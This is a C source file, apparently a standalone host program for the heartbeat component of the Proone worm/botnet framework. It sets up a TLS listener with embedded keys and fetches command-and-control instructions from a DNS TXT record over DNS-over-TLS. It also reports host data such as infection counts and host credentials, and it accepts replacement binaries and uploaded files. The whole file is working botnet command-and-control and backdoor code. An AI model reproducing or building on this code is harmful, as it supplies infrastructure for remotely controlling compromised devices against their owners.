#include <stdio.h>
#include <assert.h>
#include <ctype.h>
#include <string.h>
#include <errno.h>
#include <time.h>
#include <inttypes.h>

#include <unistd.h>
#include <fcntl.h>
#include <regex.h>
#include <arpa/inet.h>

#include "util_rt.h"
#include "htbt.h"
#include "config.h"
#include "mbedtls.h"
#include "proone_conf/x509.h"

#include <mbedtls/entropy.h>
#include <mbedtls/debug.h>

#define HELP_STR \
"Usage: %s <TXT REC> [options ...] [DNS SPECs...]\n"\
"Options:\n"\
"	<TXT REC>		Target TXT record for CNCP\n"\
"	--help			print this message\n"\
"	--no-verify		Do not verify client cert\n"\
"	--no-default-dns	Do not use hard-coded nameserver pools\n"\
"	@<DNS SPEC>		DNS over TLS nameserver\n"\
"Notes:\n"\
"	IPv4 <DNS SPEC> example: @192.0.2.1 or 192.0.2.1:853\n"\
"	IPv6 <DNS SPEC> example: @[2001:db8::1] or [2001:db8::1]:853\n"

typedef struct {
	char txtrec[256];
	bool verify;
	bool def_dns;
	prne_resolv_ns_pool_t pool4;
	prne_resolv_ns_pool_t pool6;
} htbthost_param_t;

static htbthost_param_t htbthost_param;
static regex_t re_ns4, re_ns6;
static char m_nybin_path[256];
static char m_nybin_args[1024];
static size_t m_nybin_args_size;
static sigset_t ss_all, ss_exit;
static struct timespec proc_start;
static uint8_t instance_id[16];
static char hostcred[255];
static size_t hostcred_len;

static void init_htbthost_param (htbthost_param_t *p) {
	p->verify = true;
	p->def_dns = true;
	prne_resolv_init_ns_pool(&p->pool4);
	prne_resolv_init_ns_pool(&p->pool6);
}

static void free_htbthost_param (htbthost_param_t *p) {
	prne_resolv_free_ns_pool(&p->pool4);
	prne_resolv_free_ns_pool(&p->pool6);
}

static void print_usage (const char *prog) {
	fprintf(stderr, HELP_STR, prog);
}

static bool cb_txtrec (char *out) {
	strcpy(out, htbthost_param.txtrec);
	return true;
}

static bool cb_hostinfo (prne_htbt_host_info_t *out) {
	static struct timespec now;
	static uint8_t PROG_VER[] = PRNE_PROG_VER;
	int fd;

	now = prne_gettime(CLOCK_MONOTONIC);
	out->child_uptime = out->parent_uptime = prne_sub_timespec(
		now,
		proc_start).tv_sec;
	out->bne_cnt = 0;
	out->infect_cnt = 0;
	out->parent_pid = out->child_pid = getpid();

	_Static_assert(sizeof(PROG_VER) == sizeof(out->prog_ver), "FIXME");
	memcpy(out->prog_ver, PROG_VER, sizeof(PROG_VER));

	fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY);
	if (fd >= 0) {
		read(fd, out->boot_id, sizeof(out->boot_id));
		close(fd);
	}

	_Static_assert(sizeof(instance_id) == sizeof(out->instance_id), "FIXME");
	memcpy(out->instance_id, instance_id, sizeof(instance_id));

	if (prne_htbt_alloc_host_info(out, hostcred_len)) {
		memcpy(out->host_cred, hostcred, hostcred_len);
	}

	out->crash_cnt = 0;
	out->arch = prne_host_arch;

	return true;
}

static bool cb_ny_bin (
	const char *path,
	const char *m_args,
	const size_t m_args_size)
{
	const size_t path_len = prne_nstrlen(path);

	prne_dbgast(path_len > 0);
	if (path_len + 1 > sizeof(m_nybin_path) || m_args_size > sizeof(m_nybin_args)) {
		errno = ENOMEM;
		return false;
	}

	memcpy(m_nybin_path, path, path_len + 1);
	memcpy(m_nybin_args, m_args, m_args_size);
	m_nybin_args_size = m_args_size;

	return true;
}

static void load_lbd_ssl_conf (
	mbedtls_ssl_config *conf,
	mbedtls_x509_crt *ca,
	mbedtls_x509_crt *crt,
	mbedtls_pk_context *key,
	mbedtls_dhm_context *dhm,
	mbedtls_ctr_drbg_context *rnd)
{
	static const uint8_t
		CA_CRT[] = PRNE_X509_CA_CRT,
		S_CRT[] = PRNE_X509_S_CRT,
		S_KEY[] = PRNE_X509_S_KEY,
		DH[] = PRNE_X509_DH;

	assert(
		mbedtls_ssl_config_defaults(
			conf,
			MBEDTLS_SSL_IS_SERVER,
			MBEDTLS_SSL_TRANSPORT_STREAM,
			MBEDTLS_SSL_PRESET_DEFAULT) == 0 &&
		mbedtls_x509_crt_parse(ca, CA_CRT, sizeof(CA_CRT)) == 0 &&
		mbedtls_x509_crt_parse(crt, S_CRT, sizeof(S_CRT)) == 0 &&
		mbedtls_pk_parse_key(key, S_KEY, sizeof(S_KEY), NULL, 0) == 0 &&
		mbedtls_dhm_parse_dhm(dhm, DH, sizeof(DH)) == 0 &&
		mbedtls_ssl_conf_own_cert(conf, crt, key) == 0 &&
		mbedtls_ssl_conf_dh_param_ctx(conf, dhm) == 0);
	mbedtls_ssl_conf_ca_chain(conf, ca, NULL);
	mbedtls_ssl_conf_verify(conf, prne_mbedtls_x509_crt_verify_cb, NULL);
	mbedtls_ssl_conf_rng(conf, mbedtls_ctr_drbg_random, rnd);
	mbedtls_ssl_conf_min_version(
		conf,
		MBEDTLS_SSL_MAJOR_VERSION_3,
		MBEDTLS_SSL_MINOR_VERSION_0);
}

static void mbedtls_dbg_f(void *ctx, int level, const char *filename, int line, const char *msg) {
	prne_dbgpf("<MBEDTLS> %s", msg);
}

static bool parse_param (const char *arg) {
	char str[40];
	regmatch_t rm[3];

	if (strcmp(arg, "--no-verify") == 0) {
		htbthost_param.verify = false;
	}
	else if (strcmp(arg, "--no-default-dns") == 0) {
		htbthost_param.def_dns = false;
	}
	else if (regexec(&re_ns4, arg, 3, rm, 0) == 0) {
		prne_net_endpoint_t ep;
		size_t pos;

		pos = rm[1].rm_eo - rm[1].rm_so;
		memcpy(str, arg + rm[1].rm_so, pos);
		str[pos] = 0;

		if (rm[2].rm_so >= 0) {
			if (sscanf(arg + rm[2].rm_so, ":%"SCNu16, &ep.port) != 1) {
				return false;
			}
		}
		else {
			ep.port = 853;
		}

		if (inet_pton(AF_INET, str, ep.addr.addr)) {
			ep.addr.ver = PRNE_IPV_4;
			pos = htbthost_param.pool4.cnt;
			prne_resolv_alloc_ns_pool(&htbthost_param.pool4, pos + 1);
			htbthost_param.pool4.arr[pos] = ep;
		}
		else {
			return false;
		}
	}
	else if (regexec(&re_ns6, arg, 3, rm, 0) == 0) {
		prne_net_endpoint_t ep;
		size_t pos;

		pos = rm[1].rm_eo - rm[1].rm_so;
		memcpy(str, arg + rm[1].rm_so, rm[1].rm_eo - rm[1].rm_so);
		str[pos] = 0;

		if (rm[2].rm_so >= 0) {
			if (sscanf(arg + rm[2].rm_so, ":%"SCNu16, &ep.port) != 1) {
				return false;
			}
		}
		else {
			ep.port = 853;
		}

		if (inet_pton(AF_INET6, str, ep.addr.addr)) {
			ep.addr.ver = PRNE_IPV_6;
			pos = htbthost_param.pool6.cnt;
			prne_resolv_alloc_ns_pool(&htbthost_param.pool6, pos + 1);
			htbthost_param.pool6.arr[pos] = ep;
		}
	}
	else {
		return false;
	}

	return true;
}

static char *mktmpfile (size_t req_size, const mode_t mode) {
	static int ctr = 0;
	uint8_t *z = NULL;
	size_t z_size;
	ssize_t consume;
	char *path = NULL, *ret = NULL;
	int fd = -1, len;

	z_size = prne_getpagesize();
	z = prne_calloc(1, z_size);
	if (z == NULL) {
		z_size = 1;
		z = prne_malloc(1, 1);
		z[0] = 0;
	}

	len = snprintf(NULL, 0, "htbthost-tmp.%d", ctr);
	if (len < 0) {
		goto END;
	}
	path = prne_alloc_str(len);
	if (path == NULL) {
		goto END;
	}
	prne_memzero(path, len + 1);
	if (len != snprintf(path, len + 1, "htbthost-tmp.%d", ctr)) {
		goto END;
	}

	// TODO: Polyfill
	fd = open(path, O_WRONLY | O_CREAT | O_TRUNC, mode);
	if (fd < 0) {
		goto END;
	}
	fcntl(fd, F_SETFD, FD_CLOEXEC);

	while (req_size > 0) {
		consume = prne_op_min(z_size, req_size);
		if (pth_write(fd, z, consume) != (int)consume) {
			goto END;
		}
		req_size -= consume;
	}

	ret = path;
	path = NULL;
	ctr += 1;
END:
	if (path != NULL && fd >= 0) {
		unlink(path);
	}
	prne_free(path);
	prne_close(fd);
	prne_free(z);
	return ret;
}


int main (const int argc, const char **args) {
	static mbedtls_entropy_context entropy;
	static mbedtls_ctr_drbg_context rnd;
	static prne_resolv_t *resolv;
	static prne_htbt_t *htbt;
	static prne_worker_t wkr_arr[2];
	static prne_worker_t *w;
	static struct {
		mbedtls_x509_crt ca;
		struct {
			mbedtls_x509_crt crt;
			mbedtls_pk_context key;
			mbedtls_dhm_context dhm;
			mbedtls_ssl_config conf;
		} lbd;
		struct {
			mbedtls_ssl_config conf;
		} cncp;
	} ssl;

	sigemptyset(&ss_all);
	sigemptyset(&ss_exit);
	sigaddset(&ss_all, SIGTERM);
	sigaddset(&ss_all, SIGINT);
	sigaddset(&ss_all, SIGPIPE);
	// sigaddset(&ss_all, SIGCHLD);
	sigaddset(&ss_exit, SIGTERM);
	sigaddset(&ss_exit, SIGINT);
	assert(regcomp(
		&re_ns4,
		"^@([0-9\\.]+)(:[0-9]{1,5})?$",
		REG_ICASE | REG_EXTENDED) == 0);
	assert(regcomp(
		&re_ns6,
		"^@\\[([0-9a-f:]+)\\](:[0-9]{1,5})?$",
		REG_ICASE | REG_EXTENDED) == 0);
	prne_assert(sigprocmask(SIG_BLOCK, &ss_all, NULL) == 0);
	init_htbthost_param(&htbthost_param);

	if (argc < 2) {
		print_usage(args[0]);
		return 2;
	}
	else {
		if (sscanf(args[1], "%255s", htbthost_param.txtrec) != 1 ||
			strlen(htbthost_param.txtrec) == 0)
		{
			fprintf(stderr, "Invalid <TXT REC>\n");
			return 2;
		}
		else if (strcmp("--help", args[1]) == 0) {
			print_usage(args[0]);
			return 2;
		}

		for (int i = 2; i < argc; i += 1) {
			if (strcmp("--help", args[1]) == 0) {
				print_usage(args[0]);
				return 2;
			}
			else if (!parse_param(args[i])) {
				fprintf(stderr, "Invalid option \"%s\"\n", args[i]);
				return 2;
			}
		}

		if (!htbthost_param.def_dns &&
			(htbthost_param.pool4.cnt == 0 || htbthost_param.pool6.cnt == 0)) {
			fprintf(stderr, "Empty IPv4 or IPv6 nameserver pool.\n");
			return 2;
		}
	}

	mbedtls_debug_set_threshold(1);
	pth_init();

	proc_start = prne_gettime(CLOCK_MONOTONIC);

	mbedtls_entropy_init(&entropy);
	mbedtls_ctr_drbg_init(&rnd);
	prne_assert(mbedtls_ctr_drbg_seed(
		&rnd,
		mbedtls_entropy_func,
		&entropy,
		NULL,
		0) == 0);

	mbedtls_x509_crt_init(&ssl.ca);
	mbedtls_x509_crt_init(&ssl.lbd.crt);
	mbedtls_pk_init(&ssl.lbd.key);
	mbedtls_dhm_init(&ssl.lbd.dhm);
	mbedtls_ssl_config_init(&ssl.lbd.conf);
	mbedtls_ssl_config_init(&ssl.cncp.conf);
	load_lbd_ssl_conf(
		&ssl.lbd.conf,
		&ssl.ca,
		&ssl.lbd.crt,
		&ssl.lbd.key,
		&ssl.lbd.dhm,
		&rnd);
	mbedtls_ssl_conf_authmode(
		&ssl.lbd.conf,
		htbthost_param.verify ?
			MBEDTLS_SSL_VERIFY_REQUIRED : MBEDTLS_SSL_VERIFY_NONE);
	prne_assert(mbedtls_ssl_config_defaults(
		&ssl.cncp.conf,
		MBEDTLS_SSL_IS_CLIENT,
		MBEDTLS_SSL_TRANSPORT_STREAM,
		MBEDTLS_SSL_PRESET_DEFAULT) == 0);
	mbedtls_ssl_conf_rng(&ssl.cncp.conf, mbedtls_ctr_drbg_random, &rnd);
	mbedtls_ssl_conf_dbg(&ssl.lbd.conf, mbedtls_dbg_f, NULL); // TODO

	mbedtls_ctr_drbg_random(
		&rnd,
		instance_id,
		sizeof(instance_id));

	w = wkr_arr + 0;
	if (htbthost_param.def_dns) {
		resolv = prne_alloc_resolv(
			w,
			&rnd,
			PRNE_RESOLV_DEF_IPV4_POOL,
			PRNE_RESOLV_DEF_IPV6_POOL);
	}
	else {
		resolv = prne_alloc_resolv(
			w,
			&rnd,
			prne_resolv_own_ns_pool(&htbthost_param.pool4, false),
			prne_resolv_own_ns_pool(&htbthost_param.pool6, false));
	}
	w->pth = pth_spawn(PTH_ATTR_DEFAULT, w->entry, w->ctx);
	prne_assert(resolv != NULL && w->pth != NULL);

	{
		static prne_htbt_param_t param;

		prne_htbt_init_param(&param);
		param.lbd_ssl_conf = &ssl.lbd.conf;
		param.cncp_ssl_conf = &ssl.cncp.conf;
		param.ctr_drbg = &rnd;
		param.resolv = resolv;
		param.cb_f.tmpfile = mktmpfile;
		param.cb_f.cnc_txtrec = cb_txtrec;
		param.cb_f.hostinfo = cb_hostinfo;

		w = wkr_arr + 1;
		htbt = prne_alloc_htbt(w, param);
		w->pth = pth_spawn(PTH_ATTR_DEFAULT, w->entry, w->ctx);
		prne_assert(htbt != NULL && w->pth != NULL);

		prne_htbt_free_param(&param);
	}

	while (true) {
		static int caught;

		caught = 0;
		pth_sigwait(&ss_all, &caught);
		if (sigismember(&ss_exit, caught)) {
			sigprocmask(SIG_UNBLOCK, &ss_exit, NULL);
			break;
		}
	}

	for (size_t i = 0; i < sizeof(wkr_arr)/sizeof(prne_worker_t); i += 1) {
		wkr_arr[i].fin(wkr_arr[i].ctx);
	}
	for (size_t i = 0; i < sizeof(wkr_arr)/sizeof(prne_worker_t); i += 1) {
		pth_join(wkr_arr[i].pth, NULL);
		wkr_arr[i].free_ctx(wkr_arr[i].ctx);
	}

	pth_kill();
	mbedtls_x509_crt_free(&ssl.ca);
	mbedtls_x509_crt_free(&ssl.lbd.crt);
	mbedtls_pk_free(&ssl.lbd.key);
	mbedtls_dhm_free(&ssl.lbd.dhm);
	mbedtls_ssl_config_free(&ssl.lbd.conf);
	mbedtls_ssl_config_free(&ssl.cncp.conf);
	mbedtls_ctr_drbg_free(&rnd);
	mbedtls_entropy_free(&entropy);
	free_htbthost_param(&htbthost_param);
	regfree(&re_ns4);
	regfree(&re_ns6);

	return 0;
}
